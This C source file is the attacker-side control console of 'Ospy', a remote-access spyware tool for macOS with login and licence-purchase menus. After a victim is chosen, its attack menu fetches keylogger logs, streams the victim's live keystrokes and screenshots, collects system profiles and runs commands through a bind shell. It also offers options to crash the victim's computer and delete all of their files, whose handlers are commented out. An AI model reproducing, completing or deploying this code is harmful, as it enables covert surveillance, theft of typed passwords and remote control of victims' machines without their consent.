// Attacker_main.c
//-----------------------------------------------------------------------------
// 								Attacker side
// 								-------------
//
// General : attack side of Ospy, manage the entering to the system and the attacks that the user able to make 
//
// Process : function and model base class
//
// Output  : terminal Ospy GUI
//
// Note    : Ospy is made only for Apple macOs for now.
//
//-----------------------------------------------------------------------------
// Programmer : Ori Rinat

// Date : 16.9.2018
//-----------------------------------------------------------------------------
#include "start_menu.h"
#include "entering_to_Ospy.h"
#include "attack_mode.h"
#include "connection.h"
#include "utilities.h"
#include <signal.h>
#include <stdbool.h>

static volatile bool keep_getting_keystrokes = true; // SIGINT call will change it
static volatile int keepRunningscreen = 1; 			// SIGINT call will change it

main_data data; // unencrypted main data struct, will be encrypt in the A_2_S_encrypted_message_handler function

void stop_keystrokes_stream_loop();
void stop_screen_stream_sig();

int main(){
	print_rocket_ship_image();
	while (create_connection() != CONNECTION_SUCCESS){
		printf("[\033[31;1m-\033[0m] \033[31;1mconnection failed, trying to connect again ...\033[0m\n");
		sleep(2);
	}
	#ifdef USER_MESSAGE_PROMPT
		connecting_load();
	#endif
	
	char pwd[100];
	getcwd(pwd, sizeof(pwd)); // set in "pwd" the current path
	int attacker_input;
	int left_welcome_page = false;
	char encrypted_keystroke[ENCRYPTED_TEXT_LEN(LICENSE_KEY_LENGTH)];
	
	// welcome page - entering the attacker to Ospy
	do { 
		print_large_banner();
		print_entering_menu();
	
		printf("\033[35;1m-> \033[0m");
		flush_stdin();
		attacker_input = getchar();
		
		switch (attacker_input) {
			case '1':
				if(log_in_attacker() == ENTERING_ACTION_SUCCESS)
					left_welcome_page = true;
				break;
			case '2':
				register_attacker();
				break;
			case '3':
				buy_license_key();
				break;
			default:
				printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input\033[0m\n");
				sleep(1);
				break;
		}
	} while (!left_welcome_page); // exit from the loop/welcome page if the user logged in successfully

	choose_victim();

	while(true){
		choose_attack_menu();
		printf("\033[35;1m-> \033[0m");
		flush_stdin();
		attacker_input = getchar();
		switch (attacker_input) {
			case '1': // get keylogger history file
				A_2_S_encrypted_message_handler(data, GET_KEYLOGGER_HISTORY);
				printf("\e[93m[◷] Waiting for file, please wait !\033[0m");
				fflush(stdout);
				if (recv_file(selected_victim_name, "keylogger", ".txt", "keylogger_history") == FILE_RECEIVED){
					printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m %s's keylogger history file saved successfully\033[0m\n", selected_victim_name);
					printf("[»] Ospy folder path : %s/Ospy\n", pwd);
					press_enter_to_continue();
				}
				else {	
					printf("\r[\033[31;1m-\033[0m] \033[31;1m%s's keylogger log failed to save \033[0m\n", selected_victim_name);
					sleep(2);
				}			
				break;
			case '2': // get live keystrocks stream
				signal(SIGINT, stop_keystrokes_stream_loop);
				A_2_S_encrypted_message_handler(data, GET_KEYSTROKES_STREAM);
				printf("\n[\033[33;1m!\033[0m] ctrl+c to stop getting victim's live keystrokes\n");
				printf("[\033[32;1m+\033[0m]\033[1m\033[32m %s's live key keystrokes :\033[0m\n",selected_victim_name);
				while (keep_getting_keystrokes){
					recv(attacker_socket, &encrypted_keystroke, ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN), 0);
					printf("%s", decrypt_text(encrypted_keystroke, AES_KEY));
					bzero(encrypted_keystroke, ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN));
					fflush(stdout);	
				}
				keep_getting_keystrokes = true; // set the keep_getting_keystrokes flag to the next time
				
				break;
			case '3': // get live screen stream
				signal(SIGINT, stop_screen_stream_sig);
				A_2_S_encrypted_message_handler(data, GET_SCREEN_STREAM);
				printf("\r[\033[32;1m+\033[0m] \033[1m\033[32m%s's live screen stream started successfully\033[0m\n", selected_victim_name);
				printf("[»] Ospy folder path : %s/Ospy", pwd);
				fflush(stdout);
				while (keepRunningscreen){ // it the attacker will press ^C, SIGINT signal will sand to 'stop_screen_stream_sig'
					recv_file(selected_victim_name, "screenshot", ".jpg", "screenshots");
				}	
				keepRunningscreen = 1; // in case the attacker will use this option again  
				break;
				
			case '4': // get system profiler file
				A_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
				printf("[\e[93m◷\033[0m]\e[93m This action may take about 3 minutes, please wait !\033[0m");
				fflush(stdout);
				if (recv_file(selected_victim_name, "system_profiler", ".txt", "system_profilers") == FILE_RECEIVED)
					printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m %s's system profiler saved successfully\n\033[0m", selected_victim_name);	
				else 
					printf("\r[\033[31;1m-\033[0m] \033[31;1m system profiler has unabal to saved successfully\n\033[0m");
				
				press_enter_to_continue();
				break;
	
			case '5': // send command to victim computer
				printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m The bind shell with %s created successfully\n\033[0mEnter '(S)TOP' to stop the bind shell\n\n", selected_victim_name);
				do {
					printf("\033[1m%s $ \033[0m", selected_victim_name);
					safe_scan(&data.bind_shell_command, MAX_BIND_SHELL_COMMAND);
					if (strcmp(data.bind_shell_command, "stop") == 0 || strcmp(data.bind_shell_command, "STOP") == 0 || strcmp(data.bind_shell_command, "s") == 0)
						break;
					A_2_S_encrypted_message_handler(data, SEND_BIND_SHELL_COMMAND);
					recv_file_and_print_it();
				} while (1);

				break;
				
			case '6':
				printf("[\033[33;1m!\033[0m]\033[31;1m WARNING - %s's connection with you will fail....\033[0m\nAre you sure you want to stuck %s's computer (Y/N) ?\n",selected_victim_name, selected_victim_name);
								
				printf("\033[35;1m-> \033[0m");
				flush_stdin();
				attacker_input = getchar();
				
				if (attacker_input == 'Y' || attacker_input == 'y'){
					printf("\n[\033[32;1m+\033[0m]\033[32;1m %s's COMPUTER CRASHING !\033[0m\n", selected_victim_name);
					press_enter_to_continue();
					//A_S_message_handler(data, CRASH_VICTIMS_COMPUTER);
				}
				else if (attacker_input == 'N' || attacker_input == 'n'){
					printf("\n[x] attack canceled\n");
					sleep(2);
				}
				else {
					printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input\033[0m\n");
					sleep(2);
				}
				
				break;
				
			case '7':
				printf("[\033[33;1m!\033[0m]\033[31;1m WARNING - %s's ALL files will be delete.\n    More over, the connection with you may will fail ...\033[0m\n    Are you sure you want to delete %s's all file from the coumputer (Y/N) ?\n",selected_victim_name, selected_victim_name);
												
				printf("\033[35;1m-> \033[0m");
				flush_stdin();
				attacker_input = getchar();
				
				if (attacker_input == 'Y' || attacker_input == 'y'){
					printf("\n[\033[32;1m+\033[0m]\033[32;1m DELETING %s'S ALL FILES !\033[0m\n", selected_victim_name);
					press_enter_to_continue();
					//A_S_message_handler(data, DELETE_VICTIMS_ALL_FILES );
				}
				else if (attacker_input == 'N' || attacker_input == 'n'){
					printf("\n[x] attack canceled\n");
					sleep(2);
				}
				else {
					printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input\033[0m\n");
					sleep(2);
				}
				
				break;
			case '8':
				choose_victim();
				
				break;
				
			case '9':
				exit(1);
				
				break;
				
			default:
				printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input\033[0m\n");
				sleep(1);
				
				break;
		}
	}
	
	choose_attack_menu();	
}

void stop_keystrokes_stream_loop (){
	keep_getting_keystrokes = false;
	A_2_S_encrypted_message_handler(data, STOP_KEYSTROKES_STREAM);
}

void stop_screen_stream_sig(){
	keepRunningscreen = 0;
	A_2_S_encrypted_message_handler(data, STOP_SCREEN_STREAM);
}